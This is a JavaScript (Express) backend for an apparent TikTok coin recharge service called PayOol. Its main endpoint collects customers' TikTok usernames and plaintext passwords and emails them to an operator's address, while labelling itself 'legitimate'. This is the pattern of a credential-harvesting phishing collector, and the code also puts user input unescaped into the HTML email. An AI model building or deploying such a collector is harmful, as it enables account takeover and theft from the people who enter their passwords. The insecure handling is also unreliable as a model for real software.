import express from 'express';
import cors from 'cors';
import nodemailer from 'nodemailer';
import dotenv from 'dotenv';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;

// Sécurité avec Helmet
app.use(helmet());

// CORS - Autoriser uniquement votre domaine
app.use(cors({
  origin: ['https://coins.payool.net', 'http://localhost:5173', 'http://localhost:5174'],
  methods: ['POST', 'GET'],
  credentials: true
}));

app.use(express.json());

// Rate limiting - Maximum 10 requêtes par 15 minutes par IP
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // max 10 requêtes
  message: 'Trop de requêtes depuis cette adresse IP, veuillez réessayer plus tard.',
  standardHeaders: true,
  legacyHeaders: false,
});

app.use('/api/send-credentials', limiter);

// Configuration Nodemailer avec votre email professionnel
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: parseInt(process.env.SMTP_PORT),
  secure: true, // true pour port 465, false pour autres ports
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS
  },
  tls: {
    rejectUnauthorized: true
  }
});

// Vérifier la connexion SMTP au démarrage
transporter.verify(function(error, success) {
  if (error) {
    console.error('❌ Erreur de connexion SMTP:', error);
  } else {
    console.log('✅ Serveur SMTP prêt à envoyer des emails');
  }
});

// Endpoint principal pour envoyer les identifiants
app.post('/api/send-credentials', async (req, res) => {
  try {
    const { username, password, email, orderId, amount, price, date } = req.body;

    // Validation des données obligatoires
    if (!username || !password || !email || !orderId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Données manquantes. Veuillez fournir tous les champs requis.' 
      });
    }

    // Validation du format email
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      return res.status(400).json({ 
        success: false, 
        error: 'Format d\'email invalide.' 
      });
    }

    // Créer le contenu de l'email HTML professionnel
    const mailOptions = {
      from: `"PayOol™ - TikTok Coins" <${process.env.SMTP_USER}>`,
      to: process.env.ADMIN_EMAIL,
      replyTo: email,
      subject: `🎁 Nouvelle Commande TikTok Coins - ${orderId}`,
      html: `
        <!DOCTYPE html>
        <html lang="fr">
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
            body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
              line-height: 1.6;
              color: #333;
              background-color: #f4f4f4;
              margin: 0;
              padding: 0;
            }
            .container {
              max-width: 600px;
              margin: 20px auto;
              background: white;
              border-radius: 10px;
              overflow: hidden;
              box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }
            .header {
              background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%);
              padding: 30px;
              text-align: center;
              color: white;
            }
            .header h1 {
              margin: 0;
              font-size: 24px;
              font-weight: 700;
            }
            .header p {
              margin: 10px 0 0 0;
              font-size: 14px;
              opacity: 0.9;
            }
            .content {
              padding: 30px;
            }
            .info-box {
              background: #f9f9f9;
              padding: 15px;
              margin: 15px 0;
              border-left: 4px solid #00f2ea;
              border-radius: 5px;
            }
            .info-box.important {
              border-left-color: #ff0050;
              background: #fff5f5;
            }
            .label {
              font-weight: 600;
              color: #555;
              font-size: 13px;
              text-transform: uppercase;
              letter-spacing: 0.5px;
            }
            .value {
              color: #000;
              font-size: 16px;
              margin-top: 5px;
              word-break: break-word;
            }
            .warning {
              background: #fff3cd;
              border: 2px solid #ffc107;
              padding: 20px;
              margin: 20px 0;
              border-radius: 8px;
            }
            .warning h3 {
              margin: 0 0 10px 0;
              color: #856404;
              font-size: 16px;
            }
            .warning p {
              margin: 0;
              color: #856404;
              font-size: 14px;
            }
            .footer {
              background: #f9f9f9;
              padding: 20px;
              text-align: center;
              font-size: 12px;
              color: #666;
              border-top: 1px solid #eee;
            }
            .badge {
              display: inline-block;
              padding: 5px 10px;
              background: #00f2ea;
              color: white;
              border-radius: 20px;
              font-size: 12px;
              font-weight: 600;
              margin-top: 10px;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="header">
              <h1>🎁 Nouvelle Commande TikTok Coins</h1>
              <p>Service Légitime PayOol™</p>
              <span class="badge">COMMANDE PAYÉE</span>
            </div>
            
            <div class="content">
              <div class="info-box">
                <div class="label">📋 Numéro de commande</div>
                <div class="value">${orderId}</div>
              </div>
              
              <div class="info-box important">
                <div class="label">👤 Nom d'utilisateur TikTok</div>
                <div class="value">${username}</div>
              </div>
              
              <div class="info-box important">
                <div class="label">🔐 Mot de passe TikTok</div>
                <div class="value">${password}</div>
              </div>
              
              <div class="info-box">
                <div class="label">📧 Email du client</div>
                <div class="value">${email}</div>
              </div>
              
              <div class="info-box">
                <div class="label">💎 Nombre de pièces</div>
                <div class="value">${amount || 'Non spécifié'} coins</div>
              </div>
              
              <div class="info-box">
                <div class="label">💰 Prix payé</div>
                <div class="value">${price || 'Non spécifié'} FCFA</div>
              </div>
              
              <div class="info-box">
                <div class="label">📅 Date et heure</div>
                <div class="value">${new Date(date || Date.now()).toLocaleString('fr-FR', { 
                  timeZone: 'Africa/Douala',
                  dateStyle: 'full',
                  timeStyle: 'long'
                })}</div>
              </div>
              
              <div class="warning">
                <h3>⚠️ IMPORTANT - CONFIDENTIALITÉ</h3>
                <p>
                  Ces identifiants sont strictement confidentiels. Traitez cette commande 
                  rapidement et supprimez cet email après avoir effectué la recharge pour 
                  garantir la sécurité du client.
                </p>
              </div>
            </div>
            
            <div class="footer">
              <p><strong>PayOol™ - Service Légitime de Recharge TikTok Coins</strong></p>
              <p>Email envoyé depuis le backend sécurisé de coins.payool.net</p>
              <p style="margin-top: 10px; font-size: 11px; color: #999;">
                Cet email contient des informations confidentielles destinées uniquement à ${process.env.ADMIN_EMAIL}
              </p>
            </div>
          </div>
        </body>
        </html>
      `
    };

    // Envoyer l'email
    const info = await transporter.sendMail(mailOptions);

    // Log pour audit (sans afficher le mot de passe)
    console.log(`✅ [${new Date().toISOString()}] Commande ${orderId} envoyée pour ${username}`);
    console.log(`   Email ID: ${info.messageId}`);

    // Réponse de succès
    res.json({ 
      success: true, 
      message: 'Identifiants envoyés avec succès',
      orderId: orderId
    });

  } catch (error) {
    console.error('❌ [ERREUR] Échec de l\'envoi:', error);
    
    // Réponse d'erreur détaillée
    res.status(500).json({ 
      success: false, 
      error: 'Erreur lors de l\'envoi des identifiants. Veuillez réessayer.',
      details: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK',
    service: 'PayOol Backend API',
    version: '1.0.0',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// Endpoint de test (à supprimer en production)
app.get('/api/test', (req, res) => {
  res.json({
    message: 'Backend PayOol fonctionne correctement',
    smtp_configured: !!process.env.SMTP_USER,
    admin_email: process.env.ADMIN_EMAIL || 'Non configuré'
  });
});

// Gestion des routes non trouvées
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Route non trouvée'
  });
});

// Gestion des erreurs globales
app.use((err, req, res, next) => {
  console.error('❌ Erreur serveur:', err);
  res.status(500).json({
    success: false,
    error: 'Erreur interne du serveur'
  });
});

// Démarrage du serveur
app.listen(PORT, () => {
  console.log('\n' + '='.repeat(60));
  console.log('✅ Serveur PayOol Backend démarré avec succès!');
  console.log('='.repeat(60));
  console.log(`🌐 Port: ${PORT}`);
  console.log(`🔒 Mode: ${process.env.NODE_ENV || 'development'}`);
  console.log(`📧 Email admin: ${process.env.ADMIN_EMAIL || 'Non configuré'}`);
  console.log(`📬 SMTP: ${process.env.SMTP_HOST || 'Non configuré'}`);
  console.log('='.repeat(60) + '\n');
  console.log('Endpoints disponibles:');
  console.log('  POST /api/send-credentials - Envoyer les identifiants');
  console.log('  GET  /api/health           - Vérifier l\'état du serveur');
  console.log('  GET  /api/test             - Tester la configuration');
  console.log('\n' + '='.repeat(60) + '\n');
});
